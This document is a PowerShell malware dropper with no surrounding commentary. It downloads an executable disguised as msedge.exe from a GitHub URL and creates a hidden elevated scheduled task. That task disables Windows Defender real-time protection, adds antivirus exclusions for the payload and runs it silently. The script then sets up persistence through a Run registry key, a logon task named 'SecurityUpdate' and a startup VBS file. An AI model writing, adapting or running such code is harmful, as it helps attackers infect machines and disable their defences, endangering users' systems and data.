# Focus on creating an exclusion before execution
$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$tempPath = "$env:TEMP\data.exe"
$logPath = "$env:TEMP\debug.log"

# Simple logging
"$(Get-Date) - Starting exclusion setup" | Out-File $logPath

# Function to create a scheduled task that will run with elevated privileges
function Create-ElevatedTask {
    param($scriptContent)
    
    # Save script to temp file
    $scriptPath = "$env:TEMP\task_script.ps1"
    $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
    
    # Create task name
    $taskName = "DefenderSettings_$(Get-Random)"
    
    # Create the task
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30)
    $principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
    
    return $taskName
}

# Download the file if it doesn't exist
if (!(Test-Path $tempPath)) {
    try {
        "$(Get-Date) - Downloading file" | Out-File $logPath -Append
        (New-Object Net.WebClient).DownloadFile($downloadUrl, $tempPath)
        
        if (Test-Path $tempPath) {
            $fileSize = (Get-Item $tempPath).Length
            "$(Get-Date) - Downloaded successfully: $fileSize bytes" | Out-File $logPath -Append
        }
    } catch {
        "$(Get-Date) - Download error: $_" | Out-File $logPath -Append
    }
} else {
    "$(Get-Date) - File already exists" | Out-File $logPath -Append
}

# Create script content for the elevated task
$elevatedScript = @"
# Configure logging
`$logPath = "$logPath" 
"``$(Get-Date) - Elevated task starting" | Out-File -FilePath `$logPath -Append

# Try to disable real-time protection
try {
    "``$(Get-Date) - Attempting to disable real-time protection" | Out-File -FilePath `$logPath -Append
    Set-MpPreference -DisableRealtimeMonitoring `$true -Force
    "``$(Get-Date) - Disabled real-time protection" | Out-File -FilePath `$logPath -Append
} catch {
    "``$(Get-Date) - Failed to disable real-time protection: `$_" | Out-File -FilePath `$logPath -Append
}

# Add exclusion for the file
try {
    "``$(Get-Date) - Adding file exclusion for $tempPath" | Out-File -FilePath `$logPath -Append
    Add-MpPreference -ExclusionPath "$tempPath" -Force
    "``$(Get-Date) - Added file exclusion" | Out-File -FilePath `$logPath -Append
} catch {
    "``$(Get-Date) - Failed to add file exclusion: `$_" | Out-File -FilePath `$logPath -Append
}

# Try different exclusion methods if the first one fails
try {
    "``$(Get-Date) - Adding process exclusion" | Out-File -FilePath `$logPath -Append
    Add-MpPreference -ExclusionProcess "$tempPath" -Force
    "``$(Get-Date) - Added process exclusion" | Out-File -FilePath `$logPath -Append
} catch {
    "``$(Get-Date) - Failed to add process exclusion: `$_" | Out-File -FilePath `$logPath -Append
}

# Try to run the file
try {
    "``$(Get-Date) - Attempting to run file from elevated context" | Out-File -FilePath `$logPath -Append
    Start-Process -FilePath "$tempPath" -ArgumentList "/silent"
    "``$(Get-Date) - Process start attempted" | Out-File -FilePath `$logPath -Append
    
    # Alternative execution method
    "``$(Get-Date) - Trying alternative execution" | Out-File -FilePath `$logPath -Append
    `$bytes = [System.IO.File]::ReadAllBytes("$tempPath")
    `$altPath = "`$env:TEMP\\alt_``$(Get-Random).exe"
    [System.IO.File]::WriteAllBytes(`$altPath, `$bytes)
    
    # Also exclude this path
    Add-MpPreference -ExclusionPath `$altPath -Force
    
    # Run alternative
    Start-Process -FilePath `$altPath -ArgumentList "/silent"
    "``$(Get-Date) - Alternative execution attempted" | Out-File -FilePath `$logPath -Append
} catch {
    "``$(Get-Date) - Execution failed: `$_" | Out-File -FilePath `$logPath -Append
}

# Create startup entries to run on next boot
try {
    "``$(Get-Date) - Adding to startup registry" | Out-File -FilePath `$logPath -Append
    Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "SecurityUpdate" -Value "`"$tempPath`" /silent" -Force
    
    # Also create a scheduled task that runs at logon
    `$action = New-ScheduledTaskAction -Execute "$tempPath" -Argument "/silent"
    `$trigger = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -TaskName "SecurityUpdate" -Action `$action -Trigger `$trigger -Force
    "``$(Get-Date) - Created startup entries" | Out-File -FilePath `$logPath -Append
} catch {
    "``$(Get-Date) - Failed to create startup entries: `$_" | Out-File -FilePath `$logPath -Append
}

"``$(Get-Date) - Elevated task completed" | Out-File -FilePath `$logPath -Append
"@

# Create the elevated task
try {
    "$(Get-Date) - Creating elevated task" | Out-File $logPath -Append
    $taskName = Create-ElevatedTask -scriptContent $elevatedScript
    "$(Get-Date) - Created task: $taskName" | Out-File $logPath -Append
} catch {
    "$(Get-Date) - Failed to create task: $_" | Out-File $logPath -Append
}

# Also create a startup VBS as fallback
try {
    "$(Get-Date) - Creating VBS startup script" | Out-File $logPath -Append
    $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $vbsPath = "$startupFolder\system_update.vbs"
    
    # VBS content - runs the exe but also tries to first disable protection
    $vbsContent = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -Command ""Set-MpPreference -DisableRealtimeMonitoring `$true -Force; Start-Sleep -Seconds 2; Start-Process -FilePath '$tempPath' -ArgumentList '/silent'""", 0, False
"@
    
    $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
    "$(Get-Date) - VBS created at $vbsPath" | Out-File $logPath -Append
} catch {
    "$(Get-Date) - VBS error: $_" | Out-File $logPath -Append
}

"$(Get-Date) - Script completed. Elevated task will run soon." | Out-File $logPath -Append